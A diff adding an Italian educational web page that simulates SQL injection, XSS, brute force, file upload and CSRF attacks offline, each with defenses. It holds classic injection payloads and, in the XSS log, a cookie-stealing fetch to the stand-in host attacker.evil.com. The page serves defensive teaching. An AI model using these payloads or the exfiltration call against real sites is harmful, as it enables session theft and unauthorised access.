@@ -1,0 +1,1333 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <title>Simulatore Attacchi Web - EVIL</title>
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/site-header.css?v=20260603c">
+  <link rel="stylesheet" href="/css/evil-motion.css?v=20260626">
+  <link rel="stylesheet" href="/css/site-footer.css?v=20260606">
+  <link rel="stylesheet" href="/css/responsive.css">
+  <link rel="stylesheet" href="/css/web-simulator.css?v=20260613">
+  <link rel="stylesheet" href="/css/system-theme.css?v=20260603e">
+  <script src="/js/evil-motion.js?v=20260626" defer></script>
+  <link rel="stylesheet" href="/css/evil-scrollbar.css?v=20260717">
+</head>
+<body class="evil-theme sim-page">
+  <div id="fade-overlay"></div>
+  <canvas id="matrix-canvas"></canvas>
+  <div class="sim-backdrop" aria-hidden="true">
+    <div class="sim-backdrop-mesh"></div>
+  </div>
+
+  <header role="banner" aria-label="Intestazione principale">
+    <div class="header-container">
+      <div class="logo-section">
+        <button class="img-btn" id="matrix-btn" type="button" aria-label="Attiva effetto Matrix" aria-pressed="false">
+          <img src="/html/generated-image.png" alt="Logo EVIL">
+        </button>
+        <a href="/" class="header-evil-wordmark" aria-label="EVIL — torna alla home">EVIL</a>
+      </div>
+
+      <nav role="navigation" aria-label="Menu principale">
+        <ul>
+          <li><a href="/">Home</a></li>
+
+          <li>
+            <a href="#">Didattica ▾</a>
+            <div class="dropdown">
+              <a href="web-simulator.html">Simulatore Attacchi Web</a>
+              <a href="virtual-lab.html">Lab Virtuale</a>
+              <a href="crypto-studio.html">Studio Cifratura</a>
+              <a href="quiz-hub.html">Centro Quiz</a>
+              <a href="hacked-timeline.html">Timeline Incident Response</a>
+            </div>
+          </li>
+
+          <li>
+            <a href="#">Intelligence ▾</a>
+            <div class="dropdown">
+              <a href="attacks-map.html">Mappa incidenti</a>
+              <a href="historic-attacks.html">Violazioni storiche</a>
+              <a href="malware-db.html">Catalogo malware</a>
+              <a href="malware-classification.html">Tassonomia malware</a>
+              <a href="manipulation-techniques.html">Persistenza ed evasione</a>
+            </div>
+          </li>
+
+          <li>
+            <a href="#">Strumenti ▾</a>
+            <div class="dropdown">
+              <a href="security-check.html">Check URL</a>
+              <a href="vulnerability-scanner.html">Header HTTP</a>
+              <a href="domain-recon.html">Ricognizione dominio</a>
+              <a href="file-analysis.html">Analisi file</a>
+              <a href="osint-hub.html">OSINT</a>
+            </div>
+          </li>
+        </ul>
+      </nav>
+
+      <div class="header-actions">
+        <div class="auth-buttons">
+          <button class="auth-btn account" type="button" onclick="window.location.href='login.html';" aria-label="Accedi a EVIL">Accedi</button>
+          <button class="auth-btn login" type="button" onclick="window.location.href='account.html';" aria-label="Registrati su EVIL">Registrati</button>
+        </div>
+        <button class="hamburger-btn" type="button" aria-label="Apri menu di navigazione" aria-expanded="false">
+          <span></span>
+          <span></span>
+          <span></span>
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    <section class="sim-hero sim-hero--editorial" aria-labelledby="sim-hero-title">
+      <p class="sim-section-kicker">Impara · Laboratorio web</p>
+      <h1 id="sim-hero-title">Laboratorio Attacchi Web</h1>
+    </section>
+
+    <div class="sim-phase-rail" id="phase-rail" aria-live="polite"></div>
+
+    <section class="sim-picker">
+      <header class="sim-section-head">
+        <p class="sim-section-kicker">Catalogo</p>
+        <h2>Scegli cosa studiare oggi</h2>
+      </header>
+      <div class="attack-selector" role="tablist">
+        <button type="button" class="attack-btn active" role="tab" aria-selected="true" data-attack="sql-injection">
+          SQL Injection
+          <span class="btn-sub">Manipolare query al database</span>
+        </button>
+        <button type="button" class="attack-btn" role="tab" aria-selected="false" data-attack="xss">
+          XSS
+          <span class="btn-sub">Codice nel browser della vittima</span>
+        </button>
+        <button type="button" class="attack-btn" role="tab" aria-selected="false" data-attack="brute-force">
+          Brute Force
+          <span class="btn-sub">Tentativi massivi di login</span>
+        </button>
+        <button type="button" class="attack-btn" role="tab" aria-selected="false" data-attack="file-upload">
+          File Upload
+          <span class="btn-sub">File pericolosi sul server</span>
+        </button>
+        <button type="button" class="attack-btn" role="tab" aria-selected="false" data-attack="csrf">
+          CSRF
+          <span class="btn-sub">Azioni al posto tuo</span>
+        </button>
+      </div>
+    </section>
+
+    <div class="attack-context" id="attack-context" aria-live="polite"></div>
+
+    <!-- CONTENITORI TAB SIMULAZIONE -->
+    <div id="panel-sql-injection" class="tab-content active" role="tabpanel" data-attack="sql-injection">
+      <div class="simulator-container">
+        <div class="simulation-panel">
+          <div class="panel-title">Console — SQL Injection (simulata)</div>
+          <p class="panel-hint">Prova con <code>admin</code> oppure incolla <code>admin' OR '1'='1</code> nel campo utente. Il log descrive cosa farebbe il server vulnerabile.</p>
+
+          <div class="input-group">
+            <label class="input-label" for="sql-input">Nome utente (input utente)</label>
+            <input type="text" id="sql-input" class="input-field" placeholder="es. admin o payload didattico..." value="admin" autocomplete="off">
+          </div>
+
+          <div class="input-group">
+            <label class="input-label" for="sql-password">Password</label>
+            <input type="password" id="sql-password" class="input-field" placeholder="password di prova" value="password123" autocomplete="off">
+          </div>
+
+          <button type="button" class="simulate-btn" onclick="simulateSQLInjection()">Avvia simulazione passo-passo</button>
+
+          <div class="log-output" id="sql-log" aria-live="polite">
+            <div class="log-line log-info">[PRONTO] Ambiente didattico — nessun database reale coinvolto</div>
+            <div class="log-line log-info">[INFO] Premi il pulsante per vedere le 4 fasi illuminate sopra</div>
+          </div>
+
+          <div class="risk-badge risk-critical">Impatto tipico: critico</div>
+        </div>
+
+        <aside class="learn-panel" aria-label="Spiegazione SQL Injection">
+          <div class="panel-title">Percorso didattico</div>
+
+          <div class="learn-block">
+            <h3>Fase 1 — Cosa fa l'applicazione</h3>
+            <p>Il form di login invia nome e password al backend. Il backend costruisce una stringa SQL e la manda al database per chiedere: «esiste questa coppia?».</p>
+          </div>
+
+          <div class="learn-block">
+            <h3>Fase 2 — Dove nasce il bug</h3>
+            <p>Il programmatore concatena direttamente il testo del form nella query. Il database non distingue «comandi SQL» da «dati» — legge tutto come un unico messaggio.</p>
+            <div class="code-snippet">"SELECT * FROM users WHERE user='" + input + "' AND pass='" + password + "'"</div>
+          </div>
+
+          <div class="learn-block">
+            <h3>Fase 3 — Cosa fa l'input malevolo (in teoria)</h3>
+            <p>Chiudendo la stringa con un apice e aggiungendo <code>OR '1'='1</code>, la condizione diventa sempre vera: il login può riuscire senza conoscere la password reale.</p>
+            <div class="code-snippet">admin' OR '1'='1' --</div>
+          </div>
+
+          <div class="learn-block">
+            <h3>Fase 4 — Cosa fa il difensore</h3>
+            <ul class="defense-list">
+              <li><strong>Prepared statements:</strong> il DB tratta l'input solo come dato, mai come comando.</li>
+              <li>Account DB con permessi minimi (no DROP, no file read).</li>
+              <li>Validazione lunghezza e caratteri; messaggi d'errore generici.</li>
+              <li>Audit log sulle query anomale e WAF come strato aggiuntivo.</li>
+            </ul>
+          </div>
+        </aside>
+      </div>
+    </div>
+
+    <div id="panel-xss" class="tab-content" role="tabpanel" data-attack="xss">
+      <div class="simulator-container">
+        <div class="simulation-panel">
+          <div class="panel-title">Console — XSS (simulata)</div>
+          <p class="panel-hint">Inserisci un commento normale o prova <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>. Nessuno script viene eseguito sul tuo PC: solo il flusso viene narrato.</p>
+
+          <div class="input-group">
+            <label class="input-label" for="xss-input">Commento pubblicato</label>
+            <input type="text" id="xss-input" class="input-field" placeholder="Testo del commento..." value="Mi piace questo sito!">
+          </div>
+
+          <div class="input-group">
+            <label class="input-label" for="xss-user">Nickname</label>
+            <input type="text" id="xss-user" class="input-field" value="StudenteEVIL">
+          </div>
+
+          <button type="button" class="simulate-btn" onclick="simulateXSS()">Avvia simulazione passo-passo</button>
+
+          <div class="log-output" id="xss-log" aria-live="polite">
+            <div class="log-line log-info">[PRONTO] XSS spiegato come catena browser → server</div>
+          </div>
+
+          <div class="risk-badge risk-high">Impatto tipico: alto</div>
+        </div>
+
+        <aside class="learn-panel">
+          <div class="panel-title">Percorso didattico</div>
+          <div class="learn-block">
+            <h3>Fase 1 — Superficie di attacco</h3>
+            <p>Ogni campo che finisce nell'HTML visto da altri utenti: commenti, bio, parametri in URL riflessi nella pagina.</p>
+          </div>
+          <div class="learn-block">
+            <h3>Fase 2 — Errore</h3>
+            <p>Il server salva il testo e lo reinserisce nel DOM come HTML «vivo», non come testo escapato.</p>
+            <div class="code-snippet">element.innerHTML = commentoSalvato; // pericoloso</div>
+          </div>
+          <div class="learn-block">
+            <h3>Fase 3 — Effetto sulla vittima</h3>
+            <p>Il browser della vittima interpreta tag ed eventi: furto cookie di sessione, redirect, clickjacking leggero.</p>
+            <div class="code-snippet">&lt;img src=x onerror="/* codice JS */"&gt;</div>
+          </div>
+          <div class="learn-block">
+            <h3>Fase 4 — Difesa</h3>
+            <ul class="defense-list">
+              <li>Output encoding (trattare <code>&lt;</code> come testo, non come tag).</li>
+              <li>Content-Security-Policy per bloccare script inline non autorizzati.</li>
+              <li>Cookie di sessione con flag HttpOnly e SameSite.</li>
+            </ul>
+          </div>
+        </aside>
+      </div>
+    </div>
+
+    <div id="panel-brute-force" class="tab-content" role="tabpanel" data-attack="brute-force">
+      <div class="simulator-container">
+        <div class="simulation-panel">
+          <div class="panel-title">Console — Brute Force (simulata)</div>
+          <p class="panel-hint">La wordlist sotto è solo didattica. La simulazione mostra tentativi e risposte HTTP fittizie, non invia richieste a login reali.</p>
+
+          <div class="input-group">
+            <label class="input-label" for="bf-username">Username target (fittizio)</label>
+            <input type="text" id="bf-username" class="input-field" value="admin">
+          </div>
+
+          <div class="input-group">
+            <label class="input-label" for="bf-wordlist">Wordlist (una password per riga)</label>
+            <textarea class="input-field" id="bf-wordlist" rows="6">password123
+admin123
+12345678
+qwerty
+letmein
+Studente2026!</textarea>
+          </div>
+
+          <button type="button" class="simulate-btn" onclick="simulateBruteForce()">Avvia simulazione passo-passo</button>
+
+          <div class="log-output" id="bf-log" aria-live="polite">
+            <div class="log-line log-info">[PRONTO] Ciclo tentativo/risposta simulato in locale</div>
+          </div>
+
+          <div class="risk-badge risk-high">Impatto tipico: alto</div>
+        </div>
+
+        <aside class="learn-panel">
+          <div class="panel-title">Percorso didattico</div>
+          <div class="learn-block">
+            <h3>Fase 1 — Cosa prova l'attaccante</h3>
+            <p>Automatizza POST al form di login con liste di password comuni (rockyou, leak passate, varianti stagionali).</p>
+          </div>
+          <div class="learn-block">
+            <h3>Fase 2 — Perché a volte funziona</h3>
+            <p>Password umana prevedibile + assenza di limiti: il costo per l'attaccante diventa accettabile.</p>
+          </div>
+          <div class="learn-block">
+            <h3>Fase 3 — Segnale di successo</h3>
+            <p>Risposta diversa (200 vs 401), cookie di sessione, redirect alla dashboard — il simulatore li descrive nel log.</p>
+          </div>
+          <div class="learn-block">
+            <h3>Fase 4 — Difesa</h3>
+            <ul class="defense-list">
+              <li>Rate limiting per IP e per account; CAPTCHA progressivo.</li>
+              <li>2FA (TOTP, WebAuthn) rende inutile solo la password rubata.</li>
+              <li>Alert su picchi di fallimenti; bloccare password in breach list (HIBP).</li>
+            </ul>
+          </div>
+        </aside>
+      </div>
+    </div>
+
+    <div id="panel-file-upload" class="tab-content" role="tabpanel" data-attack="file-upload">
+      <div class="simulator-container">
+        <div class="simulation-panel">
+          <div class="panel-title">Console — Upload non sicuro (simulata)</div>
+          <p class="panel-hint">Esempio didattico: file <code>foto.jpg</code> che in realtà contiene codice server. Nessun file viene caricato sul disco.</p>
+
+          <div class="input-group">
+            <label class="input-label" for="fu-filename">Nome file dichiarato</label>
+            <input type="text" id="fu-filename" class="input-field" value="avatar_falso.jpg">
+          </div>
+
+          <div class="input-group">
+            <label class="input-label" for="fu-mimetype">Content-Type inviato dal browser</label>
+            <input type="text" id="fu-mimetype" class="input-field" value="image/jpeg">
+          </div>
+
+          <div class="input-group">
+            <label class="input-label" for="fu-content">Contenuto (solo testo dimostrativo)</label>
+            <textarea class="input-field" id="fu-content" rows="4">&lt;?php // esempio didattico — mai eseguito qui ?&gt;</textarea>
+          </div>
+
+          <button type="button" class="simulate-btn" onclick="simulateFileUpload()">Avvia simulazione passo-passo</button>
+
+          <div class="log-output" id="fu-log" aria-live="polite">
+            <div class="log-line log-info">[PRONTO] Validazione file spiegata passo-passo</div>
+          </div>
+
+          <div class="risk-badge risk-critical">Impatto tipico: critico</div>
+        </div>
+
+        <aside class="learn-panel">
+          <div class="panel-title">Percorso didattico</div>
+          <div class="learn-block">
+            <h3>Fase 1 — Funzione legittima</h3>
+            <p>L'utente carica un'immagine o un PDF; il server la memorizza e mostra un link pubblico.</p>
+          </div>
+          <div class="learn-block">
+            <h3>Fase 2 — Controllo insufficiente</h3>
+            <p>Si guarda solo l'estensione o il MIME inviato dal client — entrambi falsificabili.</p>
+          </div>
+          <div class="learn-block">
+            <h3>Fase 3 — Escalation</h3>
+            <p>Se la cartella <code>/uploads</code> esegue PHP o script, aprire l'URL del file può eseguire comandi sul server.</p>
+          </div>
+          <div class="learn-block">
+            <h3>Fase 4 — Difesa</h3>
+            <ul class="defense-list">
+              <li>Whitelist estensioni + verifica magic bytes reali.</li>
+              <li>Storage su bucket senza interprete; servire file statici con Content-Disposition: attachment.</li>
+              <li>Nome random (UUID), scan antivirus, limiti dimensione.</li>
+            </ul>
+          </div>
+        </aside>
+      </div>
+    </div>
+
+    <div id="panel-csrf" class="tab-content" role="tabpanel" data-attack="csrf">
+      <div class="simulator-container">
+        <div class="simulation-panel">
+          <div class="panel-title">Console — CSRF (simulata)</div>
+          <p class="panel-hint">Domini fittizi (bank.example.com). Il log mostra come il browser «porta» la sessione senza che tu clicchi consapevolmente.</p>
+
+          <div class="input-group">
+            <label class="input-label" for="csrf-site">Sito dove sei loggato (esempio)</label>
+            <input type="text" id="csrf-site" class="input-field" value="https://bank.example.com">
+          </div>
+
+          <div class="input-group">
+            <label class="input-label" for="csrf-malicious">Pagina che visiti dopo (malevola)</label>
+            <input type="text" id="csrf-malicious" class="input-field" value="https://attacker.example/trappola">
+          </div>
+
+          <div class="input-group">
+            <label class="input-label" for="csrf-action">Azione che il sito eseguirebbe</label>
+            <input type="text" id="csrf-action" class="input-field" value="transfer?to=attacker&amount=10000">
+          </div>
+
+          <button type="button" class="simulate-btn" onclick="simulateCSRF()">Avvia simulazione passo-passo</button>
+
+          <div class="log-output" id="csrf-log" aria-live="polite">
+            <div class="log-line log-info">[PRONTO] Nessuna richiesta di rete verso domini reali</div>
+          </div>
+
+          <div class="risk-badge risk-high">Impatto tipico: alto</div>
+        </div>
+
+        <aside class="learn-panel">
+          <div class="panel-title">Percorso didattico</div>
+          <div class="learn-block">
+            <h3>Fase 1 — Sessione valida</h3>
+            <p>Hai fatto login su bank.example.com; il browser conserva un cookie di sessione.</p>
+          </div>
+          <div class="learn-block">
+            <h3>Fase 2 — Trappola cross-site</h3>
+            <p>Apri un'altra pagina che contiene form o immagine che punta a un URL sensibile della banca.</p>
+          </div>
+          <div class="learn-block">
+            <h3>Fase 3 — Richiesta «automatica»</h3>
+            <p>Il browser allega i cookie: per il server sembra una tua azione, anche se non hai confermato nulla.</p>
+            <div class="code-snippet">&lt;form action="https://bank.example.com/transfer" method="POST"&gt;...&lt;/form&gt;</div>
+          </div>
+          <div class="learn-block">
+            <h3>Fase 4 — Difesa</h3>
+            <ul class="defense-list">
+              <li>Token CSRF univoco per sessione e per form.</li>
+              <li>Cookie SameSite=Lax/Strict; verifica header Origin.</li>
+              <li>Conferma esplicita (password, 2FA) per operazioni irreversibili.</li>
+            </ul>
+          </div>
+        </aside>
+      </div>
+    </div>
+
+    <div class="status-bar" aria-label="Stato laboratorio">
+      <div class="status-bar__inner">
+        <span class="status-dot" aria-hidden="true"></span>
+        <span class="status-bar__segment"><strong>Stato:</strong> Laboratorio attivo (offline)</span>
+        <span class="status-bar__sep" aria-hidden="true">·</span>
+        <span class="status-bar__segment"><strong>Tema:</strong> <span id="lab-status-topic">SQL Injection</span></span>
+        <span class="status-bar__sep" aria-hidden="true">·</span>
+        <span class="status-bar__segment"><strong>Ultima simulazione:</strong> <span id="lab-last-run">—</span></span>
+      </div>
+    </div>
+
+  </main>
+
+  <footer class="evil-site-foot" id="site-footer">
+  <div class="evil-site-foot__glow" aria-hidden="true"></div>
+  <div class="evil-site-foot__grid">
+    <section class="evil-site-foot__col">
+      <p class="evil-site-foot__tag">Piattaforma</p>
+      <h2 class="evil-site-foot__title">EVIL Platform</h2>
+      <p class="evil-site-foot__copy">Piattaforma integrata per ricerca, simulazione e analisi della cybersecurity.</p>
+    </section>
+    <section class="evil-site-foot__col">
+      <p class="evil-site-foot__tag">Ambito</p>
+      <p class="evil-site-foot__copy">EVIL aggrega dati pubblicamente disponibili, CVE ufficiali e simulazioni controllate. Finalizzato a ricerca, formazione professionale e valutazione della sicurezza.</p>
+    </section>
+    <section class="evil-site-foot__col">
+      <p class="evil-site-foot__tag">Legale</p>
+      <p class="evil-site-foot__copy evil-site-foot__meta">© 2026 · EVIL Cybersecurity Platform</p>
+      <p class="evil-site-foot__copy">
+        <a href="site-policies.html" class="evil-site-foot__link">Policy del sito</a>
+        ·
+        <a href="help.html" class="evil-site-foot__link">Help</a>
+        ·
+        <a href="https://github.com" class="evil-site-foot__link" rel="noopener noreferrer">GitHub</a>
+      </p>
+    </section>
+  </div>
+  <p class="evil-site-foot__brand" aria-hidden="true">Impara · Simula · Difendi</p>
+</footer>
+
+
+  <script src="/js/matrixrain.js"></script>
+  <script src="/js/load-header.js"></script>
+  <script src="/js/js.js"></script>
+  <script src="/js/web-simulator-lab.js"></script>
+  <script>
+    // ============================================
+    // SQL INJECTION SIMULATION - FUNZIONA DAVVERO
+    // ============================================
+    
+    function simulateSQLInjection() {
+      const input = document.getElementById('sql-input').value || '';
+      const password = document.getElementById('sql-password').value || '';
+      const logElement = document.getElementById('sql-log');
+      
+      logElement.innerHTML = '';
+      let delay = 0;
+      
+      // STEP 1: Richiesta HTTP
+      addLogWithDelay('-----------------------------------------------------------', 'info', logElement, delay);
+      addLogWithDelay('[FASE 1] RICHIESTA HTTP VERSO IL SERVER', 'warning', logElement, delay);
+      delay += 200;
+      
+      addLogWithDelay('[?] POST /api/authenticate HTTP/1.1', 'info', logElement, delay);
+      addLogWithDelay('[?] Host: secure-app.local:443', 'info', logElement, delay);
+      addLogWithDelay('[?] Content-Type: application/x-www-form-urlencoded', 'info', logElement, delay);
+      delay += 250;
+      
+      const encodedInput = encodeURIComponent(input);
+      const encodedPassword = encodeURIComponent(password);
+      addLogWithDelay(`[?] username=${encodedInput}&password=${encodedPassword}`, 'warning', logElement, delay);
+      delay += 400;
+      
+      // STEP 2: Costruzione query
+      addLogWithDelay('-----------------------------------------------------------', 'info', logElement, delay);
+      delay += 150;
+      addLogWithDelay('[FASE 2] BACKEND COSTRUISCE LA QUERY SQL', 'warning', logElement, delay);
+      delay += 250;
+      
+      // Query vulnerabile SENZA PREPARED STATEMENT
+      const vulnerableQuery = `SELECT id, username, email, role FROM users WHERE username='${input}' AND password=MD5('${password}')`;
+      
+      addLogWithDelay('[PHP] Codice backend vulnerabile:', 'error', logElement, delay);
+      delay += 150;
+      
+      addLogWithDelay('[PHP] $query = "SELECT * FROM users WHERE username=\'$_POST[\'username\'] AND password=MD5(\'$_POST[\'password\'])"', 'error', logElement, delay);
+      delay += 250;
+      
+      addLogWithDelay('[PHP] ? QUERY COSTRUITA REALMENTE:', 'warning', logElement, delay);
+      delay += 150;
+      
+      // Analizza se c'è injection
+      const tokens = parseInput(input);
+      const hasInjection = tokens.some(t => ['OR', 'UNION', 'COMMENT', 'SEMICOLON'].includes(t.type));
+      
+      if (hasInjection) {
+        // INJECTION RILEVATA - Mostra cosa succede
+        const analyzedQuery = reconstructQuery(input, password);
+        
+        addLogWithDelay(`[SQL] ${analyzedQuery}`, 'error', logElement, delay);
+        delay += 400;
+        
+        addLogWithDelay('-----------------------------------------------------------', 'error', logElement, delay);
+        delay += 150;
+        addLogWithDelay('[!] ??  INJECTION SQL RILEVATA!', 'error', logElement, delay);
+        delay += 250;
+        
+        addLogWithDelay('[PARSER] Analisi del payload iniettato:', 'warning', logElement, delay);
+        delay += 200;
+        
+        tokens.forEach((token, i) => {
+          const meaning = getTokenMeaning(token);
+          addLogWithDelay(`[PARSER] Token ${i+1}: "${token.value}" ? ${token.type} (${meaning})`, 'error', logElement, delay);
+          delay += 150;
+        });
+        
+        delay += 300;
+        addLogWithDelay('[DB] Database MySQL riceve la query MODIFICATA...', 'error', logElement, delay);
+        delay += 250;
+        
+        // Simulazione query execution
+        if (input.toLowerCase().includes("or") && input.includes("'")) {
+          addLogWithDelay('[DB] ? Query Parser di MySQL', 'warning', logElement, delay);
+          delay += 200;
+          
+          addLogWithDelay('[DB] Valutazione WHERE:', 'error', logElement, delay);
+          delay += 150;
+          
+          const conditionAnalysis = `username='${input}' ? VERO (non matcha) BUT OR '1'='1' ? SEMPRE VERO`;
+          addLogWithDelay(`[DB] ${conditionAnalysis}`, 'error', logElement, delay);
+          delay += 250;
+          
+          addLogWithDelay('[DB] Risultato finale della WHERE: VERO per TUTTI i record', 'error', logElement, delay);
+          delay += 300;
+          
+          // Ritorna dati sensibili
+          addLogWithDelay('[DB] Righe restituite:', 'error', logElement, delay);
+          delay += 150;
+          
+          addLogWithDelay('[DB] +- ID:1 | USERNAME:admin | EMAIL:admin@secure.local | ROLE:superuser', 'error', logElement, delay);
+          delay += 200;
+          addLogWithDelay('[DB] +- ID:2 | USERNAME:moderator | EMAIL:mod@secure.local | ROLE:moderator', 'error', logElement, delay);
+          delay += 150;
+          
+          delay += 300;
+          addLogWithDelay('[PHP] Backend verifica: PRIMA RIGA = admin ? Autenticazione BYPASSATA!', 'error', logElement, delay);
+          delay += 250;
+          
+          addLogWithDelay('[AUTH] Session ID assegnato: PHPSESSID=h4x3d_0wn3d_s3ss10n', 'error', logElement, delay);
+          delay += 250;
+          
+          addLogWithDelay('[AUTH] Cookie impostato: role=superuser', 'error', logElement, delay);
+          delay += 250;
+          
+          addLogWithDelay('[?] 302 Found | Location: /admin/dashboard', 'error', logElement, delay);
+        }
+      } else {
+        // NO INJECTION - Query normale
+        addLogWithDelay(`[SQL] ${vulnerableQuery}`, 'success', logElement, delay);
+        delay += 400;
+        
+        addLogWithDelay('[?] Input validato: Nessun pattern SQL rilevato', 'success', logElement, delay);
+        delay += 250;
+        
+        addLogWithDelay('[DB] Query eseguita correttamente come query semplice', 'success', logElement, delay);
+        delay += 250;
+        
+        addLogWithDelay('[DB] Ricerca utente "' + input + '" con password corrispondente', 'info', logElement, delay);
+        delay += 250;
+        
+        addLogWithDelay('[DB] Risultato: 0 righe trovate (credenziali non valide)', 'info', logElement, delay);
+        delay += 250;
+        
+        addLogWithDelay('[?] 401 Unauthorized | Login failed', 'warning', logElement, delay);
+      }
+      
+      delay += 500;
+      addLogWithDelay('-----------------------------------------------------------', 'info', logElement, delay);
+      delay += 150;
+      addLogWithDelay('[💡 LEZIONE] Payload comune: admin\' OR \'1\'=\'1\' --', 'info', logElement, delay);
+      delay += 200;
+      addLogWithDelay('[💡 LEZIONE] Come funziona: La condizione OR "1"="1" è SEMPRE vera', 'info', logElement, delay);
+      delay += 200;
+      addLogWithDelay('[💡 LEZIONE] Risultato: Ritorna il primo utente (solitamente admin)', 'info', logElement, delay);
+      delay += 200;
+      addLogWithDelay('[🛡️ DIFESA] Usare PREPARED STATEMENTS → $stmt = $db->prepare("SELECT * FROM users WHERE username = ?")', 'success', logElement, delay);
+    }
+    
+    // Tokenizza l'input per rilevare SQL injection
+    function parseInput(input) {
+      const tokens = [];
+      const patterns = [
+        { regex: /'\s*OR\s*'/gi, type: 'OR' },
+        { regex: /'\s*AND\s*'/gi, type: 'AND' },
+        { regex: /--/g, type: 'COMMENT' },
+        { regex: /;/g, type: 'SEMICOLON' },
+        { regex: /UNION/gi, type: 'UNION' },
+        { regex: /'/g, type: 'QUOTE' },
+        { regex: /DROP|DELETE|INSERT|UPDATE/gi, type: 'DDL' },
+      ];
+      
+      let lastIndex = 0;
+      let found = false;
+      
+      for (let pattern of patterns) {
+        let match;
+        while ((match = pattern.regex.exec(input)) !== null) {
+          tokens.push({ value: match[0], type: pattern.type, index: match.index });
+          found = true;
+        }
+      }
+      
+      return tokens.length > 0 ? tokens.sort((a, b) => a.index - b.index) : [];
+    }
+    
+    // Ricostruisce la query SQL REALE con l'injection
+    function reconstructQuery(input, password) {
+      return `SELECT id, username, email, role FROM users WHERE username='${input}' AND password=MD5('${password}')`;
+    }
+    
+    // Spiega il significato di ogni token
+    function getTokenMeaning(token) {
+      const meanings = {
+        'OR': 'Operatore logico OR - Combina condizioni',
+        'AND': 'Operatore logico AND - Combina condizioni',
+        'COMMENT': 'Commento SQL - Ignora resto della query',
+        'SEMICOLON': 'Fine statement - Consente esecuzione multipla',
+        'UNION': 'Combina risultati di query multiple',
+        'QUOTE': 'Apre/chiude stringa - Rompe la sintassi originale',
+        'DDL': 'Comando DDL pericoloso - Modifica database'
+      };
+      return meanings[token.type] || 'Token sconosciuto';
+    }
+
+    // ============================================
+    // XSS SIMULATION - ANALISI REALE DEL PAYLOAD
+    // ============================================
+    
+    function simulateXSS() {
+      const input = document.getElementById('xss-input').value || '';
+      const user = document.getElementById('xss-user').value || '';
+      const logElement = document.getElementById('xss-log');
+      
+      logElement.innerHTML = '';
+      let delay = 0;
+      
+      addLogWithDelay('-----------------------------------------------------------', 'info', logElement, delay);
+      addLogWithDelay('[FASE 1] UTENTE PUBBLICA UN COMMENTO', 'warning', logElement, delay);
+      delay += 250;
+      
+      addLogWithDelay('[?] POST /comments/create HTTP/1.1', 'info', logElement, delay);
+      addLogWithDelay('[?] Host: social-forum.local', 'info', logElement, delay);
+      delay += 200;
+      
+      addLogWithDelay(`[?] username=${user}`, 'warning', logElement, delay);
+      addLogWithDelay(`[?] comment=${encodeURIComponent(input.substring(0, 50))}...`, 'warning', logElement, delay);
+      delay += 300;
+      
+      addLogWithDelay('[DB] Commento salvato nel database (SENZA SANITIZZAZIONE)', 'warning', logElement, delay);
+      delay += 250;
+      
+      addLogWithDelay('[DB] INSERT INTO comments (user_id, text) VALUES (123, \'<IL_COMMENTO_QUI>\')', 'warning', logElement, delay);
+      delay += 300;
+      
+      addLogWithDelay('-----------------------------------------------------------', 'info', logElement, delay);
+      delay += 150;
+      addLogWithDelay('[FASE 2] ALTRO UTENTE CARICA LA PAGINA CON IL COMMENTO', 'warning', logElement, delay);
+      delay += 250;
+      
+      addLogWithDelay('[?] GET /forum/thread/4521 HTTP/1.1', 'info', logElement, delay);
+      delay += 250;
+      
+      addLogWithDelay('[?] 200 OK | Rendering HTML della pagina', 'success', logElement, delay);
+      delay += 300;
+      
+      // Analizza il payload
+      const xssAnalysis = analyzeXSSPayload(input);
+      
+      if (xssAnalysis.isXSS) {
+        addLogWithDelay('-----------------------------------------------------------', 'error', logElement, delay);
+        delay += 150;
+        addLogWithDelay('[!] ??  XSS PAYLOAD RILEVATO!', 'error', logElement, delay);
+        delay += 250;
+        
+        addLogWithDelay('[PARSER] Analisi del payload:', 'warning', logElement, delay);
+        delay += 200;
+        
+        xssAnalysis.dangers.forEach((danger, i) => {
+          addLogWithDelay(`[PARSER] ${i+1}. ${danger}`, 'error', logElement, delay);
+          delay += 150;
+        });
+        
+        delay += 300;
+        addLogWithDelay('[FASE 3] BROWSER RENDERIZZA L\'HTML VULNERABILE', 'warning', logElement, delay);
+        delay += 250;
+        
+        addLogWithDelay('[JS] Codice frontend vulnerabile trovato:', 'error', logElement, delay);
+        delay += 150;
+        
+        addLogWithDelay('[JS] document.getElementById("comments-section").innerHTML = response.text;', 'error', logElement, delay);
+        delay += 250;
+        
+        addLogWithDelay('[!] innerHTML INTERPRETA il payload come HTML!', 'error', logElement, delay);
+        delay += 300;
+        
+        // Mostra come il payload viene eseguito
+        const payloadPreview = input.substring(0, 100);
+        addLogWithDelay(`[PAYLOAD] ${payloadPreview}...`, 'error', logElement, delay);
+        delay += 300;
+        
+        addLogWithDelay('[EXECUTION] Browser esegue la payload iniettata', 'error', logElement, delay);
+        delay += 250;
+        
+        // Simulazione accesso ai dati
+        if (input.toLowerCase().includes('script') || input.toLowerCase().includes('onerror')) {
+          addLogWithDelay('[JS] ? Accesso al Context Globale (window object)', 'error', logElement, delay);
+          delay += 200;
+          
+          addLogWithDelay('[JS] → window.document.cookie = "PHPSESSID=abc123xyz789; admin=true"', 'error', logElement, delay);
+          delay += 200;
+          
+          addLogWithDelay('[JS] → window.localStorage = {"password":"mypass123", "card":"1234-5678-..."}', 'error', logElement, delay);
+          delay += 250;
+          
+          addLogWithDelay('[EXFIL] Tentativo exfiltration dati sensibili:', 'error', logElement, delay);
+          delay += 150;
+          
+          addLogWithDelay('[EXFIL] fetch("http://attacker.evil.com/steal?data=" + btoa(document.cookie))', 'error', logElement, delay);
+          delay += 250;
+          
+          addLogWithDelay('[EXFIL] ? DATO ESFILATO:', 'error', logElement, delay);
+          delay += 150;
+          
+          addLogWithDelay('[EXFIL] PHPSESSID=abc123xyz789; admin=true; csrf_token=token456', 'error', logElement, delay);
+          delay += 300;
+          
+          addLogWithDelay('[PERSISTENT] Questa vulnerabilità rimane nel database!', 'error', logElement, delay);
+          delay += 250;
+          addLogWithDelay('[PERSISTENT] TUTTI i futuri visitatori della pagina subiranno lo stesso attacco', 'error', logElement, delay);
+        }
+      } else {
+        addLogWithDelay('[?] Input HTML-escaped correttamente', 'success', logElement, delay);
+        delay += 250;
+        
